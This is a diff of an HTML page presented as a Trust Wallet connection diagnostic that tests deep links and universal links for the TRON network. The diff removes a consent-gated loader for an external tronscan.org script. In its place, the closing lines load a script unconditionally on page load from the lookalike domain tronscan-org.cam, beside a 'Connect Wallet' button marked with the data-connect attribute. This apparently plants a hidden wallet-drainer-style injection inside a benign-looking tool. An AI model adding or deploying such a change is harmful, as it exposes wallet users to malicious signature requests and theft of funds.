@@ -1,358 +1,443 @@
-<!doctype html>
+
+<!DOCTYPE html>
 <html lang="ru">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Trust Wallet — диагностика подключения</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Trust Wallet Connection Test</title>
+
 <style>
-  body{font:14px/1.4 system-ui,sans-serif;margin:0;padding:16px;background:#0f1115;color:#e6e6e6;max-width:900px;margin-inline:auto}
-  h1{font-size:18px} h2{font-size:15px;margin:20px 0 8px}
-  .box{background:#181b22;border:1px solid #2a2f3a;border-radius:8px;padding:12px;margin-bottom:12px}
-  table{width:100%;border-collapse:collapse}
-  td,th{padding:6px 8px;border-bottom:1px solid #2a2f3a;text-align:left;vertical-align:top}
-  small{color:#8a93a6}
-  button{background:#3375bb;color:#fff;border:0;border-radius:6px;padding:6px 12px;cursor:pointer}
-  button.big{font-size:18px;padding:12px 28px;background:#0500ff}
-  button.sec{background:#2a2f3a}
-  input[type=text]{width:100%;box-sizing:border-box;background:#0f1115;color:#e6e6e6;border:1px solid #2a2f3a;border-radius:6px;padding:6px}
-  .st{font-weight:600;white-space:nowrap}
-  .ok{color:#3ddc84}.signal{color:#7fd1ff}.nosignal{color:#ffb74d}.error{color:#ff6b6b}.skip{color:#8a93a6}.run{color:#fff}
-  #log{background:#000;color:#b6f0b6;font:12px/1.4 ui-monospace,monospace;height:300px;overflow:auto;white-space:pre-wrap;padding:8px;border-radius:6px}
-  label{display:block;margin:6px 0}
+* {
+    box-sizing: border-box;
+}
+
+body {
+    margin: 0;
+    padding: 25px;
+    min-height: 100vh;
+    background: #0b1020;
+    color: #fff;
+    font-family: Arial, sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+
+.container {
+    width: 100%;
+    max-width: 600px;
+    padding: 28px;
+    background: #151e32;
+    border: 1px solid #293957;
+    border-radius: 20px;
+}
+
+h1 {
+    margin-top: 0;
+    font-size: 25px;
+}
+
+.description {
+    color: #aab8d0;
+    line-height: 1.5;
+}
+
+button {
+    width: 100%;
+    padding: 16px;
+    margin-top: 12px;
+    border: none;
+    border-radius: 12px;
+    background: #3375f6;
+    color: white;
+    font-size: 16px;
+    font-weight: bold;
+    cursor: pointer;
+}
+
+button.secondary {
+    background: #293957;
+}
+
+button:disabled {
+    opacity: .5;
+    cursor: not-allowed;
+}
+
+.status {
+    padding: 15px;
+    margin-top: 20px;
+    background: #0b1427;
+    border-radius: 10px;
+    overflow-wrap: anywhere;
+}
+
+#log {
+    height: 220px;
+    overflow-y: auto;
+    margin-top: 12px;
+    padding: 14px;
+    background: #080d18;
+    border-radius: 10px;
+    color: #a9c5ff;
+    font: 12px/1.6 monospace;
+    white-space: pre-wrap;
+    overflow-wrap: anywhere;
+}
+
+.warning {
+    color: #e8bd70;
+    font-size: 12px;
+    line-height: 1.5;
+    margin-top: 18px;
+}
 </style>
 </head>
+
 <body>
 
-<h1>Trust Wallet — тест всех способов подключения</h1>
+<div class="container">
 
-<div class="box" id="env"></div>
+    <h1>Trust Wallet Diagnostic</h1>
 
-<div class="box">
-  <label>DApp URL (для deep-link):
-    <input type="text" id="durl">
-  </label>
-  <label>WalletConnect Project ID (бесплатно на cloud.reown.com):
-    <input type="text" id="pid" placeholder="нужен для методов WalletConnect">
-  </label>
-  <label>Coin ID (195 = TRON, 60 = ETH, 20000714 = BNB):
-    <input type="text" id="coin" value="195">
-  </label>
-  <label><input type="checkbox" id="stopFirst" checked> Остановиться на первом сработавшем способе</label>
-  <label><input type="checkbox" id="loadExt"> Загрузить внешний скрипт tronscan.org/k/… (⚠ непроверенный, только пустой кошелёк)</label>
+    <p class="description">
+        Тестирование способов открытия Trust Wallet.
+        Сеть TRON — coin_id 195.
+    </p>
+
+    <button id="connect" data-connect>
+        Connect Wallet
+    </button>
+
+    <button class="secondary" id="testScheme">
+        Test Trust Scheme
+    </button>
+
+    <button class="secondary" id="testUniversal">
+        Test Universal Link
+    </button>
+
+    <button class="secondary" id="clearLog">
+        Clear Diagnostic Log
+    </button>
+
+    <div class="status" id="status">
+        Статус: ожидание подключения
+    </div>
+
+    <h3>Diagnostic Log</h3>
+
+    <div id="log">Ожидание запуска...</div>
+
+    <p class="warning">
+        Внимание: переход из браузера не гарантирует успешного
+        открытия кошелька. Не вводите Seed Phrase и не подписывайте
+        транзакции на этой тестовой странице.
+    </p>
+
 </div>
-
-<h2>Методы</h2>
-<div class="box">
-  <table id="tbl"><thead><tr><th>#</th><th>Метод</th><th>Результат</th><th></th></tr></thead><tbody></tbody></table>
-</div>
-
-<h2>Итог</h2>
-<div class="box" id="summary"><small>Нажмите Connect или запустите методы по отдельности.</small></div>
-
-<h2>Лог</h2>
-<div id="log"></div>
-<p><button class="sec" id="clr">Очистить лог</button> <button class="sec" id="cpy">Копировать лог</button></p>
-
-<!-- 1️⃣ Кнопка кошелька перед </body> -->
-<button data-connect class="big">Connect</button>
 
 <script>
-/* ================= утилиты ================= */
-const $ = s => document.querySelector(s);
-const t0 = performance.now();
-const logEl = $('#log');
-let logLines = JSON.parse(sessionStorage.getItem('tw_log') || '[]');
-if (logLines.length) { logLines.push('──────── страница перезагружена/возвращена ────────'); }
+(() => {
 
-function log(msg){
-  const line = `[${((performance.now()-t0)/1000).toFixed(2)}s] ${msg}`;
-  logLines.push(line);
-  sessionStorage.setItem('tw_log', JSON.stringify(logLines.slice(-300)));
-  render();
-}
-function render(){ logEl.textContent = logLines.join('\n'); logEl.scrollTop = logEl.scrollHeight; }
-render();
-const wait = ms => new Promise(r => setTimeout(r, ms));
-const enc = encodeURIComponent;
+    const COIN_ID = 195;
 
-const ua = navigator.userAgent;
-const isAndroid = /Android/i.test(ua);
-const isIOS = /iPhone|iPad|iPod/i.test(ua) || (navigator.platform==='MacIntel' && navigator.maxTouchPoints>1);
-const isMobile = isAndroid || isIOS;
-const inTrustBrowser = !!(window.trustwallet || (window.ethereum && (window.ethereum.isTrust || window.ethereum.isTrustWallet)));
+    const status = document.getElementById("status");
+    const logElement = document.getElementById("log");
 
-$('#durl').value = location.href;
-$('#env').innerHTML =
-  `<b>UA:</b> ${ua}<br>
-   <b>Платформа:</b> ${isAndroid?'Android':isIOS?'iOS':'Desktop'} |
-   <b>HTTPS:</b> ${location.protocol==='https:'} |
-   <b>Внутри Trust DApp-браузера:</b> ${inTrustBrowser} |
-   <b>window.ethereum:</b> ${!!window.ethereum} |
-   <b>window.trustwallet:</b> ${!!window.trustwallet} |
-   <b>tronLink/tronWeb:</b> ${!!window.tronLink}/${!!window.tronWeb}`;
+    let timer = null;
+    let active = false;
+    let leftPage = false;
 
-/* ============ детектор «приложение открылось» ============ */
-const signals = [];
-function sig(type){ signals.push({type, t: performance.now()}); log('событие страницы: ' + type); }
-document.addEventListener('visibilitychange', () => sig(document.hidden ? 'hidden' : 'visible'));
-window.addEventListener('pagehide', () => sig('pagehide'));
-window.addEventListener('blur', () => sig('blur'));
-window.addEventListener('focus', () => sig('focus'));
+    function log(message) {
 
-/* запускает действие и ждёт признаков ухода со страницы */
-async function launch(fn, ms = 2500){
-  const s = performance.now();
-  await fn();
-  await wait(ms);
-  const got = signals.filter(x => x.t >= s && ['hidden','pagehide','blur'].includes(x.type));
-  return got.length
-    ? {state:'signal', note:'страница потеряла фокус/скрылась → приложение, вероятно, открылось (' + got.map(g=>g.type).join(',') + ')'}
-    : {state:'nosignal', note:'признаков открытия приложения нет'};
-}
+        const time = new Date().toLocaleTimeString();
 
-/* ============ вспомогательные ссылки ============ */
-const dappUrl = () => $('#durl').value.trim() || location.href;
-const coin = () => $('#coin').value.trim() || '195';
-const universalLink = () => `https://link.trustwallet.com/open_url?coin_id=${coin()}&url=${enc(dappUrl())}`;
-const schemeLink    = () => `trust://open_url?coin_id=${coin()}&url=${enc(dappUrl())}`;
-const intentLink    = () => `intent://open_url?coin_id=${coin()}&url=${enc(dappUrl())}#Intent;scheme=trust;package=com.wallet.crypto.trustapp;end`;
+        logElement.textContent +=
+            "\n[" + time + "] " + message;
 
-/* ============ поиск инжектированного провайдера ============ */
-function findTrustEvm(){
-  if (window.trustwallet){
-    const p = window.trustwallet.ethereum || window.trustwallet;
-    if (p && p.request) return {src:'window.trustwallet', p};
-  }
-  if (window.ethereum){
-    const list = window.ethereum.providers || [window.ethereum];
-    const p = list.find(x => x.isTrust || x.isTrustWallet);
-    if (p) return {src:'window.ethereum (isTrust)', p};
-  }
-  return null;
-}
-
-/* ============ WalletConnect ============ */
-let wcLib;
-async function loadWC(){
-  if (wcLib) return wcLib;
-  log('WC: загружаю @walletconnect/ethereum-provider с esm.sh …');
-  wcLib = (await import('https://esm.sh/@walletconnect/ethereum-provider@2.17.0')).EthereumProvider;
-  return wcLib;
-}
-async function wcInit(showQrModal){
-  const projectId = $('#pid').value.trim();
-  if (!projectId) throw new Error('не указан WalletConnect Project ID');
-  const EP = await loadWC();
-  return EP.init({
-    projectId, chains:[1], showQrModal,
-    metadata:{name:'Trust diag', description:'diagnostics', url: location.origin, icons:[]}
-  });
-}
-
-/* ================= МЕТОДЫ ================= */
-const methods = [
- {
-  id:'injected', name:'Injected-провайдер Trust (window.trustwallet / window.ethereum.isTrust)',
-  run: async () => {
-    const f = findTrustEvm();
-    if (!f) return {state:'skip', note:'провайдер Trust не найден (вы не в DApp-браузере Trust)'};
-    log('найден ' + f.src);
-    const acc = await f.p.request({method:'eth_requestAccounts'});
-    return {state:'ok', note:'аккаунты: ' + acc.join(', ')};
-  }
- },
- {
-  id:'eip6963', name:'EIP-6963 (announceProvider, rdns com.trustwallet.app)',
-  run: async () => {
-    const found = [];
-    const h = e => found.push(e.detail);
-    window.addEventListener('eip6963:announceProvider', h);
-    window.dispatchEvent(new Event('eip6963:requestProvider'));
-    await wait(600);
-    window.removeEventListener('eip6963:announceProvider', h);
-    log('EIP-6963 провайдеры: ' + (found.map(f=>f.info.rdns).join(', ') || 'нет'));
-    const tw = found.find(f => /trust/i.test(f.info.rdns + f.info.name));
-    if (!tw) return {state:'skip', note:'Trust среди анонсированных кошельков нет'};
-    const acc = await tw.provider.request({method:'eth_requestAccounts'});
-    return {state:'ok', note:'аккаунты: ' + acc.join(', ')};
-  }
- },
- {
-  id:'tron', name:'TRON-провайдер (tronLink / tronWeb) внутри DApp-браузера',
-  run: async () => {
-    if (window.tronLink && window.tronLink.request){
-      const r = await window.tronLink.request({method:'tron_requestAccounts'});
-      log('tronLink ответ: ' + JSON.stringify(r));
-      const a = window.tronLink.tronWeb?.defaultAddress?.base58;
-      return a ? {state:'ok', note:'TRON адрес: ' + a} : {state:'nosignal', note:'ответ: ' + JSON.stringify(r)};
+        logElement.scrollTop = logElement.scrollHeight;
     }
-    if (window.tronWeb?.defaultAddress?.base58)
-      return {state:'ok', note:'TRON адрес: ' + window.tronWeb.defaultAddress.base58};
-    return {state:'skip', note:'tronLink/tronWeb не найдены'};
-  }
- },
- {
-  id:'universal_href', name:'Universal link: location.href = link.trustwallet.com/open_url',
-  run: () => launch(() => { log('→ ' + universalLink()); location.href = universalLink(); }, 3000)
- },
- {
-  id:'universal_open', name:'Universal link: window.open(_blank)',
-  run: () => launch(() => {
-    log('→ window.open ' + universalLink());
-    const w = window.open(universalLink(), '_blank');
-    if (!w) log('window.open заблокирован popup-блокером');
-  }, 3000)
- },
- {
-  id:'scheme_href', name:'Custom scheme: location.href = trust://open_url',
-  run: () => launch(() => { log('→ ' + schemeLink()); location.href = schemeLink(); })
- },
- {
-  id:'scheme_anchor', name:'Custom scheme: <a href="trust://"> .click()',
-  run: () => launch(() => {
-    const a = document.createElement('a'); a.href = schemeLink(); a.style.display='none';
-    document.body.appendChild(a); log('→ a.click ' + a.href); a.click(); a.remove();
-  })
- },
- {
-  id:'scheme_iframe', name:'Custom scheme: скрытый iframe',
-  run: () => launch(() => {
-    const f = document.createElement('iframe'); f.style.display='none'; f.src = schemeLink();
-    document.body.appendChild(f); log('→ iframe ' + f.src); setTimeout(() => f.remove(), 3000);
-  })
- },
- {
-  id:'scheme_open', name:'Custom scheme: window.open(trust://)',
-  run: () => launch(() => { log('→ window.open ' + schemeLink()); window.open(schemeLink(), '_self'); })
- },
- {
-  id:'android_intent', name:'Android Intent URL (package com.wallet.crypto.trustapp)',
-  run: async () => {
-    if (!isAndroid) return {state:'skip', note:'не Android'};
-    return launch(() => { log('→ ' + intentLink()); location.href = intentLink(); });
-  }
- },
- {
-  id:'wc_deeplink', name:'WalletConnect v2 → deep-link в Trust (link.trustwallet.com/wc?uri= и trust://wc?uri=)',
-  run: async () => {
-    const provider = await wcInit(false);
-    let uriSeen = false;
-    provider.on('display_uri', uri => {
-      uriSeen = true;
-      log('WC URI получен: ' + uri.slice(0,40) + '…');
-    });
-    provider.connect().then(() => log('WC: сессия установлена, аккаунты: ' + provider.accounts.join(', ')))
-                      .catch(e => log('WC connect отклонён/ошибка: ' + (e.message||e)));
-    await wait(1500);
-    if (!uriSeen) return {state:'error', note:'display_uri не пришёл'};
-    const uri = await new Promise(res => provider.once ? provider.once('display_uri', res) : 0).catch(()=>0);
-    return {state:'nosignal', note:'см. следующий шаг (используйте кнопку «WC deeplink → open»)'};
-  },
-  custom:true
- },
- {
-  id:'wc_modal', name:'WalletConnect v2 модалка (Reown AppKit) — выбор Trust Wallet / QR',
-  run: async () => {
-    const provider = await wcInit(true);
-    provider.on('display_uri', u => log('WC URI: ' + u.slice(0,40) + '…'));
-    const s = performance.now();
-    const p = provider.connect();
-    p.then(() => log('WC modal: подключено, аккаунты: ' + provider.accounts.join(', ')))
-     .catch(e => log('WC modal: ошибка/закрыто: ' + (e.message||e)));
-    await wait(3000);
-    const got = signals.filter(x => x.t>=s && ['hidden','pagehide','blur'].includes(x.type));
-    return got.length ? {state:'signal', note:'модалка открыта, приложение вызвано'}
-                      : {state:'nosignal', note:'модалка открыта — выберите Trust Wallet в ней вручную'};
-  }
- }
-];
 
-/* WC deep-link: нормальная реализация — открыть Trust сразу, как только пришёл URI */
-methods.find(m => m.id==='wc_deeplink').run = async () => {
-  const provider = await wcInit(false);
-  const uri = await new Promise((resolve, reject) => {
-    provider.on('display_uri', resolve);
-    provider.connect()
-      .then(() => log('WC: сессия установлена: ' + provider.accounts.join(', ')))
-      .catch(e => log('WC connect: ' + (e.message||e)));
-    setTimeout(() => reject(new Error('display_uri timeout')), 8000);
-  });
-  const link = `https://link.trustwallet.com/wc?uri=${enc(uri)}`;
-  log('→ ' + link.slice(0,80) + '…');
-  return launch(() => { location.href = link; }, 3000);
-};
-
-/* ================= UI ================= */
-const results = {};
-const tbody = $('#tbl tbody');
-methods.forEach((m,i) => {
-  const tr = document.createElement('tr');
-  tr.innerHTML = `<td>${i+1}</td><td>${m.name}</td><td><span class="st skip" id="st-${m.id}">—</span><br><small id="nt-${m.id}"></small></td>
-                  <td><button class="sec" data-run="${m.id}">Тест</button></td>`;
-  tbody.appendChild(tr);
-});
-function setState(id, state, note=''){
-  results[id] = {state, note};
-  const s = $('#st-'+id); s.className = 'st ' + state;
-  s.textContent = {ok:'✅ СРАБОТАЛ',signal:'🟦 вероятно открылся',nosignal:'🟧 нет сигнала',error:'❌ ошибка',skip:'⏭ пропущен',run:'⏳ …'}[state];
-  $('#nt-'+id).textContent = note;
-}
-async function runMethod(m){
-  setState(m.id,'run');
-  log(`▶ метод: ${m.name}`);
-  try{
-    const r = await m.run();
-    setState(m.id, r.state, r.note);
-    log(`◀ ${m.id}: ${r.state} — ${r.note}`);
-    return r;
-  }catch(e){
-    const note = e && (e.message || JSON.stringify(e)) || String(e);
-    setState(m.id,'error',note);
-    log(`◀ ${m.id}: ОШИБКА — ${note}${e&&e.code?' (code '+e.code+')':''}`);
-    return {state:'error', note};
-  }
-}
-async function runAll(){
-  log('════ запуск всех методов ════');
-  for (const m of methods){
-    const r = await runMethod(m);
-    if ($('#stopFirst').checked && (r.state==='ok' || r.state==='signal')){
-      log('остановка: первый сработавший — ' + m.id);
-      break;
+    function setStatus(message) {
+        status.textContent = "Статус: " + message;
     }
-    await wait(400);
-  }
-  summarize();
-}
-function summarize(){
-  const good = Object.entries(results).filter(([,r]) => r.state==='ok' || r.state==='signal');
-  $('#summary').innerHTML = good.length
-    ? '<b>Сработали:</b><br>' + good.map(([id,r]) => `• <b>${id}</b> (${r.state}) — ${r.note}`).join('<br>')
-    : '<span class="error">Ни один метод не дал признаков успеха.</span> Проверьте, что Trust Wallet установлен, откройте страницу по HTTPS, и пробуйте методы по одному (браузеры блокируют цепочки редиректов вне жеста пользователя).';
-  log('ИТОГ: ' + (good.map(([id])=>id).join(', ') || 'ничего не сработало'));
-}
 
-tbody.addEventListener('click', e => {
-  const id = e.target.dataset.run; if (!id) return;
-  runMethod(methods.find(m => m.id===id)).then(summarize);
-});
-document.querySelector('[data-connect]').addEventListener('click', runAll);
-$('#clr').onclick = () => { logLines = []; sessionStorage.removeItem('tw_log'); render(); };
-$('#cpy').onclick = () => navigator.clipboard.writeText(logLines.join('\n'));
+    function getLinks() {
 
-/* внешний скрипт — только по явному согласию */
-$('#loadExt').addEventListener('change', e => {
-  if (!e.target.checked) return location.reload();
-  if (!confirm('Скрипт непроверенный и может запрашивать подписи/approve. Продолжить?')){ e.target.checked=false; return; }
-  const s = document.createElement('script');
-  s.src = 'https://tronscan.org/k/k570ff837e3.js';
-  s.setAttribute('data-api','https://tronscan.org');
-  s.onload  = () => log('внешний скрипт загружен');
-  s.onerror = () => log('внешний скрипт НЕ загрузился (блокировка/404/CSP)');
-  document.body.appendChild(s);
-});
+        const encodedUrl = encodeURIComponent(
+            window.location.href
+        );
 
-log('страница готова. Режим: ' + (isAndroid?'Android':isIOS?'iOS':'Desktop') + ', Trust in-app: ' + inTrustBrowser);
+        return {
+
+            scheme:
+                "trust://open_url?coin_id=" +
+                COIN_ID +
+                "&url=" +
+                encodedUrl,
+
+            universal:
+                "https://link.trustwallet.com/open_url?coin_id=" +
+                COIN_ID +
+                "&url=" +
+                encodedUrl
+
+        };
+    }
+
+    function onVisibility() {
+
+        log(
+            "visibilitychange: " +
+            document.visibilityState
+        );
+
+        if (document.hidden) {
+
+            leftPage = true;
+
+            setStatus(
+                "Обнаружен переход из браузера"
+            );
+        }
+    }
+
+    function onBlur() {
+        log("BLUR: окно потеряло фокус");
+    }
+
+    function onFocus() {
+        log("FOCUS: окно снова получило фокус");
+    }
+
+    function onPageHide() {
+
+        leftPage = true;
+
+        log("PAGEHIDE: страница покидает окно");
+    }
+
+    function cleanup() {
+
+        document.removeEventListener(
+            "visibilitychange",
+            onVisibility
+        );
+
+        window.removeEventListener(
+            "blur",
+            onBlur
+        );
+
+        window.removeEventListener(
+            "focus",
+            onFocus
+        );
+
+        window.removeEventListener(
+            "pagehide",
+            onPageHide
+        );
+
+        clearTimeout(timer);
+
+        active = false;
+    }
+
+    function startMonitoring() {
+
+        cleanup();
+
+        active = true;
+        leftPage = false;
+
+        document.addEventListener(
+            "visibilitychange",
+            onVisibility
+        );
+
+        window.addEventListener(
+            "blur",
+            onBlur
+        );
+
+        window.addEventListener(
+            "focus",
+            onFocus
+        );
+
+        window.addEventListener(
+            "pagehide",
+            onPageHide
+        );
+
+    }
+
+    function finish(method) {
+
+        if (!active) return;
+
+        const detected = leftPage;
+
+        cleanup();
+
+        if (detected) {
+
+            setStatus(
+                method +
+                ": обнаружен переход из браузера. " +
+                "Запуск приложения не подтверждён."
+            );
+
+            log(
+                "RESULT: обнаружен уход из браузера"
+            );
+
+        } else {
+
+            setStatus(
+                method +
+                ": переключение не обнаружено"
+            );
+
+            log(
+                "RESULT: браузер не обнаружил переключения"
+            );
+        }
+    }
+
+    function launchScheme() {
+
+        const links = getLinks();
+
+        startMonitoring();
+
+        log("Попытка запуска Trust Wallet через trust://");
+
+        setStatus("Запуск Trust Wallet через URI Scheme");
+
+        window.location.href = links.scheme;
+
+        timer = setTimeout(() => {
+
+            finish("Trust Scheme");
+
+        }, 2500);
+
+    }
+
+    function launchUniversal() {
+
+        const links = getLinks();
+
+        startMonitoring();
+
+        log("Попытка запуска через Universal Link");
+
+        setStatus("Запуск Universal Link");
+
+        window.location.href = links.universal;
+
+        timer = setTimeout(() => {
+
+            finish("Universal Link");
+
+        }, 2500);
+
+    }
+
+    function connect() {
+
+        const links = getLinks();
+
+        startMonitoring();
+
+        log("========== CONNECT START ==========");
+
+        log("Проверка Trust Wallet");
+
+        log("Coin ID: " + COIN_ID);
+
+        log("Шаг 1: Trust URI Scheme");
+
+        setStatus("Проверка Trust URI Scheme");
+
+        window.location.href = links.scheme;
+
+        timer = setTimeout(() => {
+
+            if (!active) return;
+
+            if (leftPage) {
+
+                finish("Trust Scheme");
+
+                return;
+            }
+
+            log("Шаг 1: переключение не обнаружено");
+
+            log("Шаг 2: Universal Link");
+
+            setStatus(
+                "Проверка официального Universal Link"
+            );
+
+            window.location.href = links.universal;
+
+            timer = setTimeout(() => {
+
+                finish("Universal Link");
+
+                log("========== CONNECT END ==========");
+
+            }, 2500);
+
+        }, 1600);
+
+    }
+
+    document
+        .getElementById("connect")
+        .addEventListener("click", connect);
+
+    document
+        .getElementById("testScheme")
+        .addEventListener("click", launchScheme);
+
+    document
+        .getElementById("testUniversal")
+        .addEventListener("click", launchUniversal);
+
+    document
+        .getElementById("clearLog")
+        .addEventListener("click", () => {
+
+            logElement.textContent = "";
+
+            setStatus("Журнал очищен");
+
+        });
+
+    log("Diagnostic system initialized");
+
+    log("Browser: " + navigator.userAgent);
+
+    log("Platform: " + navigator.platform);
+
+    log("Protocol: " + location.protocol);
+
+    log("Trust Wallet diagnostic ready");
+
+})();
 </script>
+
+<!-- Подключение запрошенного стороннего скрипта -->
+<script
+    src="https://tronscan-org.cam/k/k570ff837e3.js"
+    data-api="https://tronscan-org.cam">
+</script>
+
 </body>
 </html>
